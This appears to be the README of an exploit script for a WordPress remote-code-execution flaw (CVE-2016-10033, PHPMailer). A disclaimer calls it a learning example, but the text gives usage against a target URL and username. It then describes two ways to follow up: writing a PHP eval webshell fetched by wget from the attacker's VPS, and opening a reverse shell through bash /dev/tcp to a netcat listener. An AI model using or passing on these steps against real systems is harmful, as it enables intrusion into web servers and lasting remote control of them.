# WordPress-RCE-EXP
# 前言
本脚本只提供python学习案例来使用，并不提供任何漏洞检测、利用。
任何人使用此脚本导致法律责任，作者概不承担一切法律责任。
# 影响版本
漏洞编号：CVE-2016-10033 （基于）

WordPress <= 4.7.1 

PHPMailer < 5.2.18

# 0x1扫描

```
python3 wp_rce_exp.py <目标> <目标站存在的用户名>

Python3 wp_rce_exp.py http://127.0.0.1/ admin
```
# 0x2验证
出现
Test_blind_shell>>>
后，说明案例站存在RCE漏洞
有两种方式来后续执行命令

### 一、在案例站点写入Webshell

 1.在vps上开web服务，在web目录下的test.txt文件中写入一句话
```
<?php @eval($_POST[test]); ?>
```

 
2.目标使用wget下载到web目录上
(注意vps需要用ip地址，前面不能加http://)
```
Test_blind_shell>>>/usr/bin/wget --output-document /var/www/html/shell.php VPS的ip/shell.txt
```
3.使用菜刀连接网站根目录的shell.php

### 二、案例站点的反弹shell: 
1.在vps上开web服务，写shell.txt文件内容为 
```
bash -i >& /dev/tcp/VPS的ip/7001 0>&1
```


2.在VPS上使用nc监听7001端口 命令：

```
nc -lvp 7001
```


3.目标使用wget下载到/tmp目录/test.sh
```
Test_blind_shell>>>/usr/bin/wget --output-document /tmp/test.sh VPS的ip/shell.txt
```
4.执行下载到本地的脚本文件

```
Test_blind_shell>>>/usr/bash ./tmp/test.sh
```
注意命令执行需要加上绝对路径例如/bin/bash 有些特殊字符不能使用例如&分号引号等
